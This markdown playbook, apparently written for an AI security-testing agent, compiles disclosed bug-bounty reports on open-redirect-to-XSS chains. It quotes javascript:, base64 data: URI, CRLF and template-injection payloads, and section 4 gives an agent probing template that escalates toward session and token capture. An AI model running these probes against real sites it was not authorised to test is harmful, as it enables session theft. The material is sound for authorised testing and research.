---
title: "Open Redirect to XSS Chains — javascript:/data: URIs as redirect targets, unescaped redirect params"
type: playbook
category: redirect-xss-chains
cwe: "CWE-601"
source_count: 7
full_bodies_available: 7
corpus: "h1.security.nathan.sx roster (198 rows), bodies via hackerone.com/reports/<id>.json"
list_accessed: "2026-10-28"
note: "Anchor bodies: RDIR-48516 (Twitter /intent/, $1,400 list), RDIR-143240 (Mapbox OAuth→XSS, $500 list), RDIR-196846 (Starbucks/Teavana root payload, $375 list). Claims trace to bodies read 2026-10-29."
---

# Open Redirect to XSS Chains — the redirect target executes script

## 1. Overview

Seven cases: the redirect mechanism survives intact, but the *destination value* is a script
context — `javascript:`/`data:` URIs accepted as redirect targets, or redirect params reflected
unescaped into HTML. Two shapes:

| Shape | Cases |
|---|---|
| Redirect param reflected/injected into DOM (param → markup) | 48516, 196846 |
| javascript:/data: URI accepted as the redirect target (stored or config) | 56662, 178278, 95640, 177624, 143240 |

## 2. The anchor — RDIR-48516 (twitter.com /intent/, $1,400 list)

The original_referer reflection, verbatim core:

> The problem is original_referer is not escaped if current Referrer is twitter.com. However it's
> very hard to get Referer like that because t.co is used everywhere and it kills Referers. So we
> are going to use this functionality itself twice to get proper Header.

> Normally twitter ignores user supplied "original_referer" unless Referer is twitter.com

> When the victim clicks the link it shows a dialog with "Favorite" button which has a hidden
> field in it:

*[the same wall-of-events original_referer payload, embedded as the hidden input value — elided]*

> The victim sees Return to previous site link and when clicks, it instantly loads the same page
> with original_referer=Injection.
>
> Injection is inserted "as is" and it can overwrite CSS styles of the link and also inject
> malicious events in mouseover etc.

Agent lessons:

1. **The Referer gate is the real finding** — the param is validated except when Referer is the
   site itself, and the reporter *uses the redirect flow itself twice* to manufacture the
   required Referer. The self-referencing redirect is the bypass.
2. Payload shape: a wall of `on*=alert(0)` handlers (every HTML event) — brute-force the event
   list when you can't identify the sink.
3. Cross-window discipline: this row pays $1,400 as XSS, its sibling 46818 ($560 json) is the
   iframe→parent redirect (`top.window.location.href`) — same /intent/ family, module 07 overlap.

## 3. javascript:/data: URIs as redirect targets

- **RDIR-56662 (shopify admin/redirects, informative)** — stored redirect accepts script URIs:
  > 3. add redirects as:
  > javascript:alert(document.domain)
  > or data:text/html;base64,PHNjcmlwdD5hbGVydCgiY29va2llIHN0ZWFsOiAiK2RvY3VtZW50LmNvb2tpZSk7d2luZG93LmxvY2F0aW9uLmhyZWY9J2h0dHA6Ly93d3cuZ29vZ2xlLmNvbSc7PC9zY3JpcHQ+
  > (XSS and URL redirect)
- **RDIR-178278 (parc.informatica.com, medium)** — endpoint= accepts both:
  > Go to *https://parc.informatica.com/partners/apex/Cloud_chat?endpoint=javascript:alert(document.domain)*
  > and Open redirect: *https://parc.informatica.com/partners/apex/Cloud_chat?endpoint=http://evil.com*
- **RDIR-95640 (udemy JWPlayer, informative)** — player config via URL params:
  > **logo.link** can contain one of the following payloads:
  > - //google.com.ua           <-- this can be used for users **redirection**
  > - data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=    <--  this can be used
  >   for **execution of any JavaScript code (XSS) in context of about:blank.**
- **RDIR-177624 (team.badoo.com, $140 json)** — CRLF opens the data: URI:
  > https://team.badoo.com/%0d%0adata:text/html;text,%3Csvg%2fonload%3Dprompt%281%29%3E
  > Since your server is configured pretty good that i can't do attack like HTTP response splitting
  > or redirect to external url, i decided to test XSS on it.
- **RDIR-143240 (mapbox.com/authorize, $500 list)** — the OAuth-redirect-to-template chain:
  > If you only send the parameter __redirect_uri__ in the request to
  > https://www.mapbox.com/core/oauth/auth, the response from the server is a 302 redirect to the
  > value passed in the parameter __redirect_uri__.
  > The problem is that the value of the property `"authorize_url"` is not escaped when passed to
  > the template
  > ```html
  > <form id='oauth' method='post' action='<%=App.api + obj.authorize_url%>' ...>
  > ```
  Attacker hosts the JSON response (CORS-configured) → `authorize_url: "'><script>alert(document.domain);</script>"`.
- **RDIR-196846 (Starbucks/Teavana, $375 list)** — the tag-strip-then-redirect chain:
  > one can make a redirect by modifying GET parameters with this structure : `<>//google.com`
  > There seems to be a stripping of tags and after that some chained redirect, that will
  > eventually trigger an XSS vulnerability if the payload is like : `<>javascript:alert(document.cookie);`

## 4. Agent execution template

```text
P0 — for every redirect param found (module 01 inventory), probe script-URI targets:
     ?p=javascript:alert(0)   ?p=data:text/html,<script>...   ?p=vbscript: (era) 
     ?p=%0d%0adata:text/html;... (CRLF → Location split → data:)
P1 — identify the emission context: Location: header (30x) vs window.location= vs template var.
     javascript: only executes on client-side emission (zseano §1: "If it's a 302 redirect then
     it will not work, but if they are redirecting via javascript then it will work").
P2 — Referer-gated reflections: replay the flow that sets the required Referer (48516 pattern —
     use the app's own redirect to manufacture the header).
P3 — config-driven players/embeds: enumerate their option names via docs (logo.link, abouttext).
P4 — chain impact: XSS → session/token capture → module 03 chain gates.
```

## 5. Validation gates

1. Script execution shown in the *redirect target context* — URL bar / DOM proof, not a header echo.
2. Browser-conditional behavior named (177624: Firefox era-specific; 99435-style rows: name it).
3. For stored redirect targets (56662): show the config UI + the executing link.
4. 30x-only redirects: `javascript:` claims must show the client-side emission source.

## 6. Adjacency

- javascript:-URI acceptance is the same sink class as stored-XSS config fields — cross-reference
  `../XSS` vault's stored lanes for the sink taxonomy.
- CRLF→data: (177624) borders master row 14 (response splitting).
- zseano §1's XSS-via-javascript: doctrine is byte-quoted in `references/blogs-index.md`.

## 7. Archive-label honesty

- 1 json ($140), 3 list ($1,400, $500, $375), 3 untagged informative rows. The informative rows
  (56662, 95640, plus 46818-family) carry the technique value.
- 196846's title says "open redirect / reflected XSS payload in root that affects all your sites" —
  multi-site claim verified per-domain in body (starbucks.* listed with one exception noted).

## 8. Cross-references

- Module 07 (cross-window control rows 46818/23386), module 03 (token capture as the escalation),
  `../XSS` vault (sink taxonomy).
